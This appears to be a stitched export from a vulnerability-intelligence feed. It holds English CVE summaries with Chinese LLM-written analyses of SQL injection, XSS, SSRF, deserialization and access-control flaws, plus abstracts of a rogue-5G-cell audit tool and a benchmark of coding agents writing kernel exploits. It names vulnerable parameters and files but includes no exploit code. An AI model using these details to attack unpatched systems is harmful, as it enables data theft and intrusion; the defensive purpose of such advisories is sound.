When a policy operator has written `capabilities = ["deny"]` on a path with a trailing wildcard but allowed a broader list operation (e.g., a `deny` on `secrets/metadata/restricted/*` but allowed `list` on `secrets/metadata/*`), OpenBao would incorrectly allow the operation. This did not impact other operation types.

## Patches

This has been patched in OpenBao v2.6.0.

items.title: 5G-Shark: A Network Security Auditor for 5G Subscriber Privacy and Unauthenticated Signalling Resilience
items.summary: The fifth generation of mobile networks was standardised with an explicit mandate to close long-standing privacy and security gaps, mandating the concealment of the subscriber's permanent identity, resistance to generational downgrade, and protection against location tracking. Assessing whether these guarantees hold in operational networks, however, requires separating two sources of residual exposure that prior studies do not distinguish and do not evaluate in the wild: protocol-design limitations, which remain exploitable even against a fully specification-compliant deployment, and implementation gaps, which arise from incomplete or non-compliant implementations. We present 5G-Shark, a security assessment tool and methodology that turns a legitimate mobility procedure against the subscriber. Rather than relying on active jamming or malformed-packet injection, 5G-Shark manipulates the standardised cell-reselection criterion to pull a target User Equipment onto a self-created rogue cell, establishing an attack vantage with minimal service disruption. Then, the proposed methodology effectively performs the required interactions to expose the security risks of the system under test, classifying them into the aforementioned categories. Built solely from open-source stacks and Software Defined Radio hardware and evaluated against commercial 5G Standalone deployments, 5G-Shark requests subscriber identifiers, forces Radio Access Technology downgrade via crafted Registration Reject codes, and induces denial-of-service states. For each vector, we attribute the root cause to protocol design or deployment non-compliance. We further provide empirical evidence that in several commercial deployments, temporary identifiers are re-allocated in near-sequential steps that keep successive values linkable, a weakness that enables persistent user tracking despite correct subscriber ID concealment.

llm_summary.summary_zh: 第五代移动通信标准在制定时被明确要求弥补长期存在的隐私与安全短板：隐藏用户永久身份（SUCI 加密与归属网络公钥机制）、抵御制式降级攻击、防止位置追踪。然而论文指出，要判断这些承诺在现网中是否真正兑现，必须区分两类此前研究未加区分、也缺乏现网验证的残余暴露来源：一是协议设计层面的固有限制——即便部署完全符合规范仍然可被利用；二是实现层面的缺陷——源自不完整或不一致的实现。为此作者提出 5G-Shark，一套安全评估工具与方法论，其核心思路是把终端合法的移动性流程（小区重选）反过来用于攻击者目的：不依赖主动干扰或畸形报文注入，而是操纵标准化的重选判据，将目标用户设备牵引到自建的伪小区上，从而以对业务影响极小的方式取得攻击观测位。随后按既定步骤与被测系统交互，暴露其安全风险，并逐项归因到“协议设计缺陷”或“部署不合规”两类。工具完全基于开源协议栈与软件无线电（SDR）硬件构建，并在商用 5G 独立组网（SA）现网中完成评估，验证了可请求用户标识、可通过构造的注册拒绝原因触发无线接入制式降级、并可诱导拒绝服务状态等风险向量。论文还给出实证：在若干商用部署中，临时标识（如 5G-GUTI）以近似顺序的方式重新分配，使相邻取值之间保持可链接性，导致即使永久身份隐藏正确实现，攻击者仍可对用户进行持续追踪。总体贡献在于：提出残余暴露的分类框架、给出可复用的现网评估方法学与开源工具链、并用实测证据把隐私风险从规范文本落到现网部署层面。
llm_summary.why_it_matters_zh: 它把 5G 隐私保护的评估从“看规范是否合规”推进到“看现网是否真的不可追踪”，并区分了无法通过升级实现的协议设计缺陷与可通过整改修复的实现缺陷，直接影响运营商 5G SA 安全基线与监管审计口径。
llm_summary.impact_zh: 适用于运营商 5G SA 现网隐私与信令健壮性评估、终端隐私测试、监管与认证机构的合规核查，以及把“临时标识可链接性”纳入内部安全基线；其方法论可迁移到 4G/5G 互操作、漫游与非独立组网场景。

items.title: Evaluating Coding Agents on Kernel Exploit Generation
items.summary: Coding agents now find real vulnerabilities in production software. However, bug discovery results do not measure whether agents can construct exploit primitives. We introduce KEX-bench, a benchmark for evaluating coding agents on exploit primitive generation against real operating-system kernels. KEX-bench contains 45 task instances across 40 Linux and Windows CVEs, covering kernel address leak, instruction-pointer control, heap read, heap write, and arbitrary address write. Each task runs in an isolated virtual machine, exposes controlled tools, and uses a deterministic verifier to check primitive-specific success. We evaluate state-of-the-art coding agents paired with frontier and open-weight models under fixed tool-call budgets. Without a reference proof of concept (PoC), the strongest configuration solves 1 of 20 Windows tasks (5.0%) and 14 of 25 Linux tasks (56.0%). With a reference PoC, the strongest configuration solves 31 of 45 tasks (68.9%). This highlights the gap where agents reach kernel crashes but fail to shape kernel state into exploit primitives. We release KEX-bench for reproducible research on AI-assisted exploitation at https://kex-bench.github.io.

llm_summary.summary_zh: 该论文研究的是编码智能体（coding agents）在漏洞利用方向上的能力边界问题。研究背景是：当前编码智能体已能在生产软件中发现真实漏洞，但"能否发现 bug"并不等于"能否构造利用原语（exploit primitive）"，而后者才是决定漏洞真实危害等级的关键环节，此前缺少可量化、可复现的评测手段。为此，作者提出 KEX-bench：一个面向真实操作系统内核、用于评测智能体生成利用原语的基准。KEX-bench 包含 45 个任务实例，覆盖 40 个 Linux 与 Windows CVE，任务按原语类型划分为内核地址泄露、指令指针控制、堆读、堆写、任意地址写五类。工程上，每个任务运行在隔离虚拟机中，向智能体暴露受控的工具集合，并由确定性验证器（deterministic verifier）判定特定原语是否真正达成，从而避免主观打分带来的噪声。评测设计上，作者将当前最先进的编码智能体分别与前沿闭源模型和开放权重模型配对，在固定工具调用预算下进行对比。主要实验结果：在没有参考 PoC 的条件下，最强配置仅解决 20 个 Windows 任务中的 1 个（5.0%），解决 25 个 Linux 任务中的 14 个（56.0%）；在提供参考 PoC 的条件下，最强配置解决 45 个任务中的 31 个（68.9%）。作者据此指出一个关键能力断层：智能体往往能让内核崩溃，却难以把崩溃后的内核状态塑造成受控的利用原语。基准已公开，用于推动 AI 辅助漏洞利用方向的可复现研究。适合漏洞研究、红队能力评估、内核安全加固与 AI 安全评测方向的研究者与工程师阅读。

detection_signals_zh: 虚拟机或沙箱内出现针对特定内核 CVE 的批量、重复崩溃触发行为
隔离环境中出现自动化工具链的密集调用序列（远超人工节奏）
内核 panic/oops 后伴随异常的信息泄露探测（如反复读取内核地址相关接口）
同一主机或同一测试集群在短时间内横跨多个 CVE 的失败—重试模式
CI/测试环境中出现非授权启动的嵌套虚拟化或内核调试配置变更
defense_advice_zh: 梳理资产中与这 40 个 Linux/Windows CVE 对应的内核版本，优先处理 Linux 侧对应面，勿因"仅崩溃"而降低修复优先级
核查内核加固基线：KASLR 强度与信息泄露面收敛、SMEP/SMAP、CFI、堆分配器加固、只读页表等控制流与内存防护是否已启用
对隔离/沙箱环境增加异常内核崩溃与高频重试的检测与告警，并把其纳入自动化利用尝试的行为指标
缩短内核补丁的暴露窗口，建立从 CVE 公开到内核更新上线的时限指标
若内部使用编码智能体做漏洞挖掘，为其单独划分低权限沙箱与工具白名单，并记录工具调用审计日志
llm_summary.recommended_action_zh: 研究跟进：研读论文与公开基准，评估其任务划分与确定性验证方法是否可复用到内部漏洞修复优先级打分与自动化利用能力评估中。

items.why_it_matters: 它首次把评测重心从"发现漏洞"推进到"能否构造利用原语"，并给出可复现的内核级基准与确定性判定方法。防守方可据此校准对自动化漏洞利用能力的真实预期：智能体目前更擅长触发崩溃而非完成可靠利用，但已有参考时成功率显著上升。

items.title: A security flaw has been discovered in JusticeRage Manalyze 1.0.0. Impacted is the function PE::_parse_relocations of the file manape/pe.cpp of the component PE Parser. Performi...
items.summary: A security flaw has been discovered in JusticeRage Manalyze 1.0.0. Impacted is the function PE::_parse_relocations of the file manape/pe.cpp of the component PE Parser. Performing a manipulation of the argument BlockSize results in integer underflow. The attack requires a local approach. The patch is named c372b6bbca9d8c63812be50596fefa4a79c65fd0. It is recommended to apply a patch to fix this issue.

llm_summary.summary_zh: 该漏洞影响开源 PE 文件静态分析工具 JusticeRage Manalyze 1.0.0。Manalyze 常被蓝队、恶意软件分析人员和沙箱流水线用于检查 Windows PE 可执行文件的结构、节区、导入表、资源与重定位信息，属于分析不可信样本时的常用辅助工具。本次缺陷位于 manape/pe.cpp 文件中的 PE::_parse_relocations 函数，即 PE 解析器组件负责处理重定位表（relocation table）的代码路径。问题成因是：当解析器处理重定位块时，对传入的 BlockSize（重定位块大小）参数进行运算时未做充分的边界与合法性校验，使得在特定取值下发生整数下溢（integer underflow）。下溢后得到的长度或偏移值会脱离预期范围，进而在后续的缓冲区读取或循环遍历中造成越界访问等异常行为。攻击模型为本地（AV:L），要求攻击者具备低权限（PR:L），无需用户交互（UI:N），且不改变作用域（S:U）。从影响维度看，机密性（C:N）与完整性（I:N）均无影响，仅可用性（A:L）受低程度影响，典型后果是解析进程崩溃或异常终止，即本地拒绝服务性质的问题。因此 NVD 给出的 CVSS 3.1 基础评分为 3.3，属于低危。该问题不属于可远程触发的路径，也未见 EPSS 评分数据。官方已发布修复补丁，补丁提交标识为 c372b6bbca9d8c63812be50596fefa4a79c65fd0，建议使用方升级到包含该补丁的版本。当前元数据中未标记该漏洞已列入 KEV，也未标记存在在野利用或已武器化的情况。
llm_summary.why_it_matters_zh: Manalyze 常在沙箱与分析流水线中解析不可信 PE 样本，该整数下溢可导致分析进程崩溃，影响流水线可用性。但仅需本地低权限、只影响可用性、CVSS 3.3，且无在野利用迹象，整体优先级较低。
llm_summary.impact_zh: 本地低权限用户在目标主机上触发解析特制 PE 文件时，可造成 PE 重定位块大小整数下溢，引发进程崩溃或异常终止，形成本地拒绝服务。不涉及数据泄露或文件篡改，无远程可利用性，未观察到在野利用。

items.title: A vulnerability was found in SourceCodester Smart Attendance System with QR Code Scanner 1.0. This issue affects the function prepend of the file student_signup.php of the compo...
items.summary: A vulnerability was found in SourceCodester Smart Attendance System with QR Code Scanner 1.0. This issue affects the function prepend of the file student_signup.php of the component Self-Registration. Performing a manipulation of the argument full_name results in cross site scripting. Remote exploitation of the attack is possible. The exploit has been made public and could be used.

llm_summary.summary_zh: 根据 NVD 披露，CVE-2026-95957 影响 SourceCodester 出品的 Smart Attendance System with QR Code Scanner 1.0（带二维码扫描的智能考勤系统）。该漏洞位于自助注册（Self-Registration）组件下的 student_signup.php 文件，问题集中在处理 full_name（姓名）参数的逻辑中：程序未对该参数做充分的过滤、校验或输出编码，攻击者通过操纵该参数即可注入脚本内容，最终形成跨站脚本（XSS）漏洞。NVD 描述指出，此类攻击可经网络远程发起，攻击者无需持有有效账户或特权即可投递构造好的输入；但实际触发需要受害者进行一定交互（例如访问被注入的页面或提交被污染的表单），因此 CVSS 3.1 向量为 AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N，基础评分 4.3，属于中等严重度。该评分表明成功利用主要影响完整性（低），对机密性与可用性无直接影响，作用域保持不变。NVD 还明确说明，该漏洞的利用方式已被公开、可能被拿来使用，因此尽管评分不高，仍具备现实的可操作性，不宜长期搁置。当前该 CVE 未被列入 CISA KEV，来源字段也未标注在野利用状态，EPSS 分数缺失；厂商信息、具体受影响版本清单以及官方补丁情况在本次元数据中均未提供，需以厂商后续公告为准。
llm_summary.why_it_matters_zh: 自助注册页面通常直接暴露在互联网，属于未认证即可访问的入口。该 XSS 可被用于会话窃取、钓鱼跳转与前端挂马，虽评分仅 4.3（中等），但利用方式已公开，互联网暴露的部署实例应优先处置。
llm_summary.impact_zh: 未认证远程攻击者可向 full_name 参数注入脚本，在受害者浏览器上下文执行，导致会话/Cookie 窃取、页面篡改、凭据钓鱼或重定向；按 CVSS 评估仅完整性受损（低），机密性与可用性不受直接影响，作用域不变，需用户交互。

items.title: A security vulnerability has been detected in iFlytek astron-agent up to 1.0.6. Affected by this vulnerability is the function UrlCheckTool.checkUrl of the component debugToolV2...
items.summary: A security vulnerability has been detected in iFlytek astron-agent up to 1.0.6. Affected by this vulnerability is the function UrlCheckTool.checkUrl of the component debugToolV2 API endpoint. The manipulation of the argument endPoint leads to server-side request forgery. The attack can be initiated remotely. Upgrading to version reward-1575 addresses this issue. The identifier of the patch is 45ee5fb647e9894e73b0d7720fa94a66e4540bbb. The affected component should be upgraded.

llm_summary.summary_zh: 讯飞星火 astron-agent 是一款面向智能体开发与编排的框架。在 1.0.6 及更早版本中，其 debugToolV2 API 端点的 UrlCheckTool.checkUrl 函数存在服务端请求伪造（SSRF）漏洞。由于该函数对传入的 endPoint 参数未做充分的合法性校验，攻击者可在仅需低权限的条件下，远程构造恶意请求，诱使服务器向任意地址发起出站连接。攻击者可借此探测内网拓扑、访问云环境元数据服务（如 169.254.169.254）获取临时凭证，或对内网未授权服务进行访问，进而可能导致横向移动与敏感信息泄露。该漏洞的 CVSS 3.1 评分为 6.3（AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L），属于中危级别。目前厂商已发布 reward-1575 版本修复此问题，对应补丁提交为 45ee5fb647e9894e73b0d7720fa94a66e4540bbb。建议所有使用该组件的用户尽快升级，并对 debugToolV2 接口实施网络访问控制。
llm_summary.why_it_matters_zh: SSRF 可使攻击者以服务器身份访问内网和云元数据，导致凭证泄露与横向移动；虽暂未见在野利用，但公网暴露实例应优先修复。
llm_summary.impact_zh: 成功利用可导致内网资产探测、云元数据凭证窃取、内部服务未授权访问，并可能作为进一步攻击的跳板。

items.why_it_matters: SSRF 可使攻击者以服务器身份访问内网和云元数据，导致凭证泄露与横向移动；虽暂未见在野利用，但公网暴露实例应优先修复。

items.title: A weakness has been identified in iFlytek astron-agent up to 1.0.7. Affected is an unknown function of the file console/backend/commons/src/main/resources/mapper/ChatBotMarketMa...
items.summary: A weakness has been identified in iFlytek astron-agent up to 1.0.7. Affected is an unknown function of the file console/backend/commons/src/main/resources/mapper/ChatBotMarketMapper.xml of the component getBotList API endpoint. Executing a manipulation of the argument sortDirection can lead to sql injection. It is possible to launch the attack remotely. Upgrading to version reward-1575 is able to address this issue. This patch is called 6702be70ae802b1048f5fbec91e690e7b71a4165. You should upgrade the affected component.

llm_summary.summary_zh: 该漏洞影响科大讯飞 iFlytek astron-agent 至 1.0.7 版本。问题出在 console/backend/commons/src/main/resources/mapper/ChatBotMarketMapper.xml 映射文件所对应的 getBotList API 端点，其内部对 sortDirection（排序方向）参数的传入内容未做充分校验与过滤，攻击者可以通过构造该参数的值实现 SQL 注入。由于该接口可通过网络远程访问，且攻击者仅需低权限（PR:L）即可发起，因此具备实际可利用条件；不过利用过程不需要用户交互，也未改变作用域（S:U）。CVSS 3.1 评分为 6.3（AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L），机密性、完整性与可用性影响均为低，属于中危级别。典型的成因是 MyBatis 的 ORDER BY / 动态排序片段直接拼接外部可控字符串，未能使用参数化占位符或白名单校验，导致原本用于排序的字段名或排序方向成为注入载体。成功利用后，攻击者可能读取、篡改数据库中的业务数据，或在特定条件下影响服务可用性，具体范围取决于后端数据库账号的权限配置。厂商已在新版本 reward-1575 中修复该问题，对应补丁提交为 6702be70ae802b1048f5fbec91e690e7b71a4165。截至目前，NVD 元数据中未将该漏洞列入 CVE 已利用漏洞目录（KEV），也没有任何来源标记其存在在野利用行为，因此应定位为需要及时修复但尚未观测到真实攻击的中危缺陷。
llm_summary.why_it_matters_zh: Web 接口的排序参数可从网络直接触达且只需低权限即可利用，一旦后端数据库账号权限过大，可能造成数据泄露或被篡改；目前已提供正式修复版本，属于应尽快排期修补的中危缺陷。
llm_summary.impact_zh: 攻击者可经 getBotList 接口注入 SQL，影响范围包括数据库机密性、完整性与可用性；实际危害程度取决于数据库账号权限与服务部署方式。当前未被列入 KEV，无公开在野利用标记。

items.why_it_matters: Web 接口的排序参数可从网络直接触达且只需低权限即可利用，一旦后端数据库账号权限过大，可能造成数据泄露或被篡改；目前已提供正式修复版本，属于应尽快排期修补的中危缺陷。

items.title: A security flaw has been discovered in recommenders-team recommenders up to 1.2.1. This impacts the function pickle.load of the file recommenders/models/newsrec/io/mind_iterator...
items.summary: A security flaw has been discovered in recommenders-team recommenders up to 1.2.1. This impacts the function pickle.load of the file recommenders/models/newsrec/io/mind_iterator.py of the component Dict Loading. Performing a manipulation results in deserialization. It is possible to initiate the attack remotely. The exploit has been released to the public and may be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.

llm_summary.summary_zh: CVE-2026-95928 影响 recommenders-team 维护的推荐系统开源库 recommenders 1.2.1 及更早版本。漏洞位于推荐模型新闻推荐场景的数据读取模块 recommenders/models/newsrec/io/mind_iterator.py，具体问题出在其中名为 pickle.load 的函数调用上，属于典型的不可信数据反序列化缺陷。MIND 迭代器在加载字典（Dict Loading 组件）等数据文件时直接使用 Python pickle 反序列化，而 pickle 格式本身不具备安全性：只要攻击者能够控制或替换被加载的数据文件，就可以在反序列化过程中构造恶意对象，从而在目标进程内执行任意代码或篡改数据。NVD 描述指出该问题可被远程触发，攻击者通常需要通过投递恶意数据文件、污染数据源或中间人替换等方式，使受害者用该迭代器加载被篡改的文件。CVSS 3.1 评分为 5.5（AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L），属于中等风险：网络可利用、无特殊前置条件，但需要低权限以及一定程度的用户交互，成功利用后对机密性、完整性和可用性各造成有限影响。厂商已通过 issue 报告被提前告知该问题，但截至目前尚未作出回应，也未见官方修复版本发布。输入数据中未标注该漏洞已被列入 KEV 或已确认在野利用；仅元数据描述提到公开利用代码已发布，使用方应据此提高警惕。
llm_summary.why_it_matters_zh: 反序列化漏洞一旦被利用即可在运行训练/推理管道的进程内执行任意代码，ML 平台常被赋予较高的数据与算力权限，横向移动价值大。该组件默认不校验数据来源，且厂商尚未回应、暂无补丁，修复窗口不确定。
llm_summary.impact_zh: 成功利用可导致恶意数据文件在反序列化时触发任意代码执行或数据篡改，影响范围限于加载不可信 MIND 字典文件的进程权限；CVSS 3.1 为 5.5，机密性、完整性、可用性影响均为低。

items.why_it_matters: 反序列化漏洞一旦被利用即可在运行训练/推理管道的进程内执行任意代码，ML 平台常被赋予较高的数据与算力权限，横向移动价值大。该组件默认不校验数据来源，且厂商尚未回应、暂无补丁，修复窗口不确定。

items.title: A vulnerability was identified in SourceCodester Online Reviewer Management System 1.0. This affects an unknown function of the file /reviewer_0/admins/assessments/pretest/exam-...
items.summary: A vulnerability was identified in SourceCodester Online Reviewer Management System 1.0. This affects an unknown function of the file /reviewer_0/admins/assessments/pretest/exam-delete.php. Such manipulation of the argument test_id leads to sql injection. The attack may be performed from remote. The exploit is publicly available and might be used.

llm_summary.summary_zh: CVE-2026-95927 是 SourceCodester Online Reviewer Management System 1.0 中的一个 SQL 注入漏洞。该漏洞影响文件 /reviewer_0/admins/assessments/pretest/exam-delete.php 中的未知功能，攻击者可通过操纵 test_id 参数注入恶意 SQL 语句。由于该参数未经过充分过滤，远程未认证攻击者能够借此读取、修改或删除数据库中的敏感信息，甚至可能进一步控制底层数据库。该漏洞的 CVSS 3.1 评分为 7.3，向量为 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L，表明攻击者无需认证即可通过网络远程利用，且对机密性、完整性和可用性均造成低影响。目前公开的利用代码已经存在，可能被攻击者用于实际攻击。鉴于该系统可能用于在线评审管理，存储其中的用户数据、评估结果等敏感信息面临泄露风险。建议受影响用户尽快联系厂商获取补丁，或采取临时缓解措施，如限制对 exam-delete.php 的访问、部署 Web 应用防火墙过滤 SQL 注入攻击，并遵循最小权限原则配置数据库账户。
llm_summary.why_it_matters_zh: 该漏洞允许未认证远程攻击者通过 SQL 注入访问数据库，且已有公开利用代码，对使用该系统的组织构成直接威胁，需优先修复。
llm_summary.impact_zh: 攻击者可远程利用该 SQL 注入漏洞，未经认证读取、篡改或删除数据库内容，可能导致敏感信息泄露、数据完整性破坏或服务中断。

items.why_it_matters: 该漏洞允许未认证远程攻击者通过 SQL 注入访问数据库，且已有公开利用代码，对使用该系统的组织构成直接威胁，需优先修复。

The impacted element is an unknown function of the file /reviewer_0/admins/assessments/pretest/btn_functions.php?action=update. This manipulation of the argument test_id causes sql injection. llm_summary.summary_zh: CVE-2026-95926 是 SourceCodester Online Reviewer Management System 1.0 中被确认的一处 SQL 注入漏洞。受影响的处理逻辑位于文件 /reviewer_0/admins/assessments/pretest/btn_functions.php 的 action=update 分支，这是一个用于更新测评（pretest）记录的后端处理入口。漏洞根因在于该逻辑对 test_id 参数未做充分的类型校验与参数化处理，导致外部可控输入被直接拼接到 SQL 查询语句中，攻击者可通过构造恶意取值改变查询语义，从而读取、篡改或删除数据库中的敏感内容。CVSS v3.1 打分为 7.3，向量为 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L，说明该漏洞可远程触发、无需任何认证凭据、也无需用户交互，利用门槛较低；机密性、完整性与可用性影响均评估为低，通常对应可读取部分数据表、篡改部分记录或造成有限的服务异常。受影响组件为 SourceCodester 出品的 Online Reviewer Management System 1.0，属于常见的 PHP + MySQL 教学/小型评测类 Web 应用，大量以默认配置直接部署在公网或内网服务器上。描述信息同时指出该漏洞的利用方式已经被公开披露，存在被扫描器或自动化工具批量尝试的可能，但当前 NVD 元数据中未标注已列入 KEV，也未标注发现大规模在野攻击。厂商层面暂未在本次输入中提供对应补丁或缓解版本信息。

items.title: ClipBucket v5 before 5.5.3-#182 contains a blind SQL injection vulnerability in the photo search endpoint where the query parameter is passed unsanitized into SQL WHERE and ORDE...
items.summary: ClipBucket v5 before 5.5.3-#182 contains a blind SQL injection vulnerability in the photo search endpoint where the query parameter is passed unsanitized into SQL WHERE and ORDER BY clauses. Unauthenticated attackers can exploit time-based blind SQL injection techniques to extract user credentials, email addresses, and administrator password hashes for account takeover.

llm_summary.summary_zh: ClipBucket v5 是一款开源视频分享与媒体托管平台。根据 NVD 元数据，5.5.3-#182 之前的版本在照片搜索端点（photo search endpoint）中存在盲注型 SQL 注入漏洞：该接口接收的 query 参数未经任何净化与参数化处理，被直接拼接进 SQL 语句的 WHERE 子句和 ORDER BY 子句，导致攻击者可以操纵后端查询结构。由于该端点无需认证即可访问，未授权攻击者能够利用基于时间的盲注（time-based blind SQLi）技术，通过观察响应延迟逐位推断数据库内容，从而逐步提取平台用户的登录凭据、电子邮箱地址以及管理员账户的密码哈希。拿到管理员密码哈希后，攻击者可进一步实施离线破解或哈希传递，最终实现对管理后台的账户接管，完全控制站点内容与用户数据。CVSS 3.1 评分为 7.5，向量为 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N，即攻击可远程发起、复杂度低、无需权限与用户交互、仅影响机密性但影响程度为高。NVD 元数据未将该 CVE 列入 KEV，也未标注已在野利用或已武器化；EPSS 数据缺失。修复方式为升级到 5.5.3-#182 或更高版本，并在代码层面对搜索、排序等可控参数改用预编译语句与白名单校验。
llm_summary.why_it_matters_zh: 该漏洞无需认证、利用门槛低，可直接泄露用户凭据与管理员密码哈希，进而导致账户接管与整站沦陷；公开暴露的 ClipBucket 站点应优先处置。
llm_summary.impact_zh: 机密性高影响：未授权攻击者可通过时间盲注逐位窃取用户凭据、邮箱与管理员密码哈希，造成账户接管、站点被完全控制及用户数据泄露；完整性与可用性未受直接影响。

items.title: Photoview through 2.4.0 contains an authorization bypass vulnerability in the shareAlbum GraphQL mutation that allows authenticated users to create share links for albums owned ...
items.summary: Photoview through 2.4.0 contains an authorization bypass vulnerability in the shareAlbum GraphQL mutation that allows authenticated users to create share links for albums owned by other users. Attackers can supply arbitrary album IDs to generate working share tokens for victim albums, exposing photos and sub-albums to anyone with the link while retaining indefinite control over token settings.

llm_summary.summary_zh:
Photoview 是一款开源的、面向自建服务器的照片与相册管理应用，支持通过 Web 界面浏览、整理以及对外分享照片与子相册。根据 NVD 披露的元数据，CVE-2026-96271 影响 Photoview 2.4.0 及更早版本，问题出在其 GraphQL 接口的 shareAlbum 变更（mutation）中。该接口本应用于让相册所有者为自己拥有的相册生成对外分享链接，但实现上缺少对相册归属关系的有效校验，构成典型的授权绕过（Broken Access Control / IDOR 类逻辑缺陷）。

具体而言，任何已通过身份认证的普通用户，都可以在调用 shareAlbum 时传入属于其他用户的任意 album ID，从而为该受害者相册成功创建一个可用的分享令牌（share token）。由于返回的分享链接是真实有效的，任何拿到该链接的人（无论是否登录）都能直接访问被分享相册中的照片及其子相册内容，造成敏感图片的非授权泄露。更严重的是，攻击者在创建该分享链接后，仍保留对令牌设置的控制权，可使其保持长期有效、难以被察觉，受害者甚至可能不知道自己相册已被对外公开。

从利用条件看，该漏洞需要攻击者拥有一个低权限的已认证账号，属于网络可达、无需用户交互、复杂度低的场景，CVSS 3.1 评分为 7.1（AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N），机密性影响为高，完整性与可用性影响有限，因此被评为高危。NVD 元数据中未将该漏洞列入 KEV，也未标注在野利用状态，故不能推断其已被实际利用或武器化。

受影响产品为 Photoview 2.4.0 及之前版本；元数据未提供更细的厂商与部署形态信息，实际受影响范围取决于部署实例是否对多用户开放注册或存在不受信任的低权限账号。防御侧建议：尽快升级到修复版本；若暂无补丁，应临时收紧 GraphQL 分享相关接口的访问权限，确保服务不对公网直接暴露，并通过鉴权日志与审计检索异常的 shareAlbum 调用。
llm_summary.why_it_matters_zh: 任意已登录的低权限用户即可为他人相册生成有效分享链接，导致照片与子相册在无授权情况下对外泄露，且令牌可长期留存、受害者难以察觉；该漏洞利用门槛低、影响面广，对多用户或开放注册的 Photoview 实例构成直接的数据泄露风险。
llm_summary.impact_zh: 成功利用可造成受害用户相册及其子相册中的照片被任意持链接者访问，机密性受到严重影响（CVSS 机密性影响为高），同时分享令牌设置可被攻击者长期操控，存在持续泄露与数据治理失控的风险。

items.summary: A vulnerability was found in SourceCodester Online Reviewer Management System 1.0. The affected element is an unknown function of the file /reviewer_0/admins/assessments/databank/btn_functions.php?action=update. The manipulation of the argument difficulty_id results in sql injection. The attack can be executed remotely. The exploit has been made public and could be used.

llm_summary.summary_zh: CVE-2026-95925 是披露于 SourceCodester Online Reviewer Management System 1.0 中的一个 SQL 注入漏洞。根据 NVD 元数据，受影响的是文件 /reviewer_0/admins/assessments/databank/btn_functions.php 中一个未具名的功能函数，攻击者通过向 action=update 的处理路径传入 difficulty_id 参数并对其进行恶意构造，即可将未经过滤的输入拼入后端 SQL 语句，从而改变查询语义并实现注入。该漏洞可远程触发，利用复杂度低，无需任何身份认证与用户交互，CVSS 3.1 基础评分为 7.3（向量 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L），机密性、完整性、可用性影响均评定为低。NVD 描述明确指出该漏洞的利用方式已被公开，存在被他人直接复用的可能，因此尽管当前尚未列入 CISA KEV，也没有厂商或第三方标注的在野利用记录，仍应视为需要优先处置的高风险问题。该产品属于常见的 PHP 教学/小型业务系统，通常直接部署在 Web 根目录并对外暴露，且历史上此类 SourceCodester 组件的漏洞利用代码流传度较高。当前输入未提供受影响产品版本范围之外的厂商信息、官方补丁编号与 EPSS 评分，因此修复状态与真实利用概率仍需结合资产清单与厂商公告进一步确认。
llm_summary.why_it_matters_zh: 无需认证、远程即可触发的高危 SQL 注入，且利用细节已公开，攻击者可复用现成方法读取或篡改数据库；该类小型 PHP 系统常直接暴露在互联网，缺乏维护与更新，守卫方应优先排查资产暴露面。
llm_summary.impact_zh: 成功利用可绕过应用层校验直接操作后端数据库，导致业务数据、账号口令等敏感信息泄露或被篡改，并可能因查询异常造成服务不可用；由于注入点位于管理端功能文件，若系统对外网开放，攻击门槛较低。

llm_summary.summary_zh: CVE-2026-95924 是一个被披露于 NVD 的 SQL 注入漏洞，影响 SourceCodester 出品的 Online Reviewer Management System 1.0。根据官方描述，问题出在文件 /reviewer_0/admins/assessments/databank/btn_functions.php 中 action=add 分支所对应的功能函数上：该处理逻辑在接收请求参数 difficulty_id 时未做充分的输入校验与参数化处理，直接将其拼接进数据库查询语句，导致攻击者可以通过构造恶意输入改变原有 SQL 语义，从而实施注入攻击。由于该接口通过 HTTP 暴露，攻击者可以在远程、无需任何身份认证与用户交互的条件下发起利用，CVSS 3.1 评分为 7.3（向量 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L），属于高危级别，攻击复杂度低，且对机密性、完整性与可用性均有低度影响。官方描述同时指出，该漏洞的利用细节已经向公众披露，因此存在被扫描器、自动化工具或攻击者直接复用的风险，但从现有元数据来看，尚无任何证据表明该漏洞已被列入 CVE 已知被利用漏洞目录（KEV），也没有来源标记其已在真实环境中被利用。该产品属于在线测评/考试复习管理系统，通常部署在教学机构或企业培训环境中，其后端管理接口往往直接面向内网或公网开放，一旦被成功利用，攻击者可能读取、篡改或删除数据库中的测评题目、用户账号与成绩等敏感数据，甚至为进一步的权限提升或横向移动提供跳板。由于厂商信息、受影响版本范围与官方补丁状态在本次元数据中均未提供，建议使用方先行确认自身版本，将管理后台及该类 databank 相关接口限制在可信网络内访问，并尽快评估厂商是否发布修复版本或采用参数化查询方式缓解该注入风险。
llm_summary.why_it_matters_zh: 该漏洞为无需认证、可远程触发的 SQL 注入，利用细节已公开，攻击门槛低；受影响系统多为教学/培训机构的管理平台，数据库内常含学员信息与成绩，一旦被注入可造成数据泄露与篡改。当前元数据未显示其已被列入 KEV 或存在在野利用。

items.title: A security vulnerability has been detected in Dask up to 2026.8.0. This affects the function from_npy_stack of the file dask/array/core.py of the component Loader. Such manipula...
items.summary: A security vulnerability has been detected in Dask up to 2026.8.0. This affects the function from_npy_stack of the file dask/array/core.py of the component Loader. Such manipulation leads to deserialization. The attack can be launched remotely. The exploit has been disclosed publicly and may be used. The project was informed of the problem early through an issue report but has not responded yet.

